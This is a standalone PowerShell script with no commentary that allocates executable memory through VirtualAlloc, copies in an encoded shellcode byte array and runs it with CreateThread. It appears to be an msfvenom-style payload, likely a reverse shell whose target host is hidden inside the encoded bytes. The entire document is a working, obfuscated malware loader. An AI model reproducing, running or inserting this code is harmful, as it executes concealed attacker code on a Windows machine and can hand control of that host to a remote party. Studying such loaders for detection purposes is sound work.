$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xd9,0x74,0x75,0xe7,0xd9,0xe9,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x6a,0x13,0x03,0x6a,0x13,0x83,0xc2,0xdd,0x96,0x80,0x1b,0x35,0xd4,0x6b,0xe4,0xc5,0xb9,0xe2,0x01,0xf4,0xf9,0x91,0x42,0xa6,0xc9,0xd2,0x07,0x4a,0xa1,0xb7,0xb3,0xd9,0xc7,0x1f,0xb3,0x6a,0x6d,0x46,0xfa,0x6b,0xde,0xba,0x9d,0xef,0x1d,0xef,0x7d,0xce,0xed,0xe2,0x7c,0x17,0x13,0x0e,0x2c,0xc0,0x5f,0xbd,0xc1,0x65,0x15,0x7e,0x69,0x35,0xbb,0x06,0x8e,0x8d,0xba,0x27,0x01,0x86,0xe4,0xe7,0xa3,0x4b,0x9d,0xa1,0xbb,0x88,0x98,0x78,0x37,0x7a,0x56,0x7b,0x91,0xb3,0x97,0xd0,0xdc,0x7c,0x6a,0x28,0x18,0xba,0x95,0x5f,0x50,0xb9,0x28,0x58,0xa7,0xc0,0xf6,0xed,0x3c,0x62,0x7c,0x55,0x99,0x93,0x51,0x00,0x6a,0x9f,0x1e,0x46,0x34,0x83,0xa1,0x8b,0x4e,0xbf,0x2a,0x2a,0x81,0x36,0x68,0x09,0x05,0x13,0x2a,0x30,0x1c,0xf9,0x9d,0x4d,0x7e,0xa2,0x42,0xe8,0xf4,0x4e,0x96,0x81,0x56,0x06,0x5b,0xa8,0x68,0xd6,0xf3,0xbb,0x1b,0xe4,0x5c,0x10,0xb4,0x44,0x14,0xbe,0x43,0xab,0x0f,0x06,0xdb,0x52,0xb0,0x77,0xf5,0x90,0xe4,0x27,0x6d,0x31,0x85,0xa3,0x6d,0xbe,0x50,0x59,0x6b,0x28,0x7e,0x82,0xe9,0x7b,0xe8,0xb8,0x0d,0x7a,0x29,0x35,0xeb,0x2c,0xf9,0x16,0xa4,0x8c,0xa9,0xd6,0x14,0x64,0xa0,0xd8,0x4b,0x94,0xcb,0x32,0xe4,0x3e,0x24,0xeb,0x5c,0xd6,0xdd,0xb6,0x17,0x47,0x21,0x6d,0x52,0x47,0xa9,0x82,0xa2,0x09,0x5a,0xee,0xb0,0xfd,0xaa,0xa5,0xeb,0xab,0xb5,0x13,0x81,0x53,0x20,0x98,0x00,0x04,0xdc,0xa2,0x75,0x62,0x43,0x5c,0x50,0xf9,0x4a,0xc8,0x1b,0x95,0xb2,0x1c,0x9c,0x65,0xe5,0x76,0x9c,0x0d,0x51,0x23,0xcf,0x28,0x9e,0xfe,0x63,0xe1,0x0b,0x01,0xd2,0x56,0x9b,0x69,0xd8,0x81,0xeb,0x35,0x23,0xe4,0xed,0x0a,0xf2,0xc0,0x9b,0x62,0xc6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};